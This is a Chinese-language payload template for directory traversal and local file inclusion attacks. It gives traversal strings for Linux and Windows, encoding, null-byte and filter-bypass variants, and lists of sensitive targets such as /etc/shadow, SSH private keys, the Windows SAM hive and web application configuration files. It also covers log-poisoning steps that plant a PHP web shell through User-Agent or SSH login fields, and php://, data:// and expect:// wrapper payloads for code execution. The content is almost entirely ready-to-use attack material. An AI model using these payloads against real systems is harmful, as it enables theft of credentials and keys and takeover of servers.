# 目录穿越 Payload 模板

## 基础检测

### Unix/Linux

```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd

/etc/passwd
/etc/shadow
/etc/hosts
/etc/issue
/etc/group
/etc/hostname
/etc/resolv.conf
/etc/ssh/sshd_config
/etc/mysql/my.cnf
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
/var/log/auth.log
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/proc/self/fd/3
/proc/self/fd/4
/proc/self/fd/5
```

### Windows

```
..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\system32\config\sam
..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts

c:\windows\win.ini
c:\windows\system32\config\sam
c:\windows\system32\drivers\etc\hosts
c:\inetpub\logs\logfiles\w3svc1\*.log
c:\inetpub\wwwroot\web.config
c:\xampp\apache\conf\httpd.conf
c:\Program Files\Apache Software Foundation\Apache2.2\conf\httpd.conf
```

## 绕过技术

### 编码绕过

```
# URL 编码
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# 双重 URL 编码
..%252f..%252f..%252fetc%252fpasswd

# Unicode 编码
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cetc/passwd

# UTF-8 过长编码
..%c0%ae%c0%ae%c0%af..%c0%ae%c0%af..%c0%ae%c0%afetc/passwd
```

### 平台特定

```
# Windows 特有
..\
..\..\
..\..\..\
..\..\..\..\windows\win.ini
....\
....\
....\
....\windows\win.ini

# UNC 路径
\\127.0.0.1\c$\windows\win.ini
\\localhost\c$\windows\win.ini
\\?\c:\windows\win.ini
```

### 过滤绕过

```
# 过滤了 ../
....//....//....//etc/passwd
..././..././..././etc/passwd
..%00/
..%00/
..%c0%af

# 过滤了 etc/passwd
/etc/./passwd
/etc/././passwd
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd%00.png
/etc/passwd%00.html

# 过滤了开头
/var/www/html/../../../etc/passwd
./../../../etc/passwd
```

### Null 字节绕过

```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png
../../../etc/passwd%00.html
../../../etc/passwd%00.txt
```

## 敏感文件路径

### Linux

```
# 系统信息
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/issue
/etc/hostname
/etc/resolv.conf
/etc/fstab
/etc/crontab
/etc/profile
/etc/bash.bashrc

# SSH
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/home/user/.ssh/authorized_keys

# Web 服务器
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/httpd/conf/httpd.conf
/var/www/html/index.php
/var/www/html/wp-config.php
/var/www/html/config.php

# 数据库
/etc/mysql/my.cnf
/etc/mysql/debian.cnf
/var/lib/mysql/mysql/user.MYD
/var/lib/mysql/mysql/user.frm

# 日志
/var/log/auth.log
/var/log/syslog
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/mysql/mysql.log

# 进程信息
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd
/proc/self/exe
/proc/self/fd/
/proc/self/maps
/proc/self/mem
/proc/self/status
/proc/version

# 应用配置
/var/www/html/wp-config.php
/var/www/html/configuration.php
/var/www/html/settings.php
/var/www/html/config.inc.php
/var/www/html/application/config/database.php
/app/config/database.yml
/app/config/parameters.yml
/config/database.yml
/config/settings.py
```

### Windows

```
# 系统信息
c:\windows\win.ini
c:\windows\system32\drivers\etc\hosts
c:\windows\system32\config\sam
c:\windows\system32\config\system
c:\windows\system32\config\software

# 日志
c:\inetpub\logs\logfiles\w3svc1\*.log
c:\windows\system32\logfiles\w3svc1\*.log
c:\windows\system32\winevt\logs\system.evtx
c:\windows\system32\winevt\logs\security.evtx

# Web 服务器
c:\inetpub\wwwroot\web.config
c:\xampp\apache\conf\httpd.conf
c:\xampp\apache\logs\access.log
c:\xampp\mysql\data\mysql\user.frm

# IIS
c:\windows\system32\inetsrv\config\applicationhost.config

# 应用配置
c:\inetpub\wwwroot\web.config
c:\xampp\htdocs\wp-config.php
c:\wamp\www\wp-config.php
```

## 高级利用

### 日志投毒

```
# 通过 User-Agent 注入 PHP 代码
User-Agent: <?php system($_GET['cmd']); ?>

# 然后包含日志文件
/var/log/apache2/access.log?cmd=id
/var/log/nginx/access.log?cmd=id

# SSH 日志投毒
ssh '<?php system($_GET["cmd"]); ?>'@target.com
# 然后包含
/var/log/auth.log?cmd=id
```

### PHP 伪协议

```
# php://filter
php://filter/convert.base64-encode/resource=../../../etc/passwd
php://filter/read=string.rot13/resource=../../../etc/passwd
php://filter/convert.iconv.utf-8.utf-16/resource=../../../etc/passwd

# php://input
php://input
# POST 数据: <?php system('id'); ?>

# data://
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data://text/plain,<?php system($_GET['cmd']); ?>

# phar://
phar:///path/to/archive.phar/file.txt

# zip://
zip:///path/to/archive.zip#file.txt
```

### Wrapper 绕过

```
# expect://
expect://id

# php://filter with ROT13
php://filter/read=string.rot13/resource=php://filter/read=string.rot13/resource=../../../etc/passwd
```

## 文件下载检测

```
# 响应差异判断
1. 返回文件内容 - 存在漏洞
2. 返回错误信息 - 可能存在漏洞，需要绕过
3. 返回空白页 - 可能被过滤，尝试绕过
4. 返回默认文件 - 路径被重置，尝试其他路径

# 时间差异判断
1. 正常路径响应时间
2. 穿越路径响应时间
3. 不存在文件响应时间
```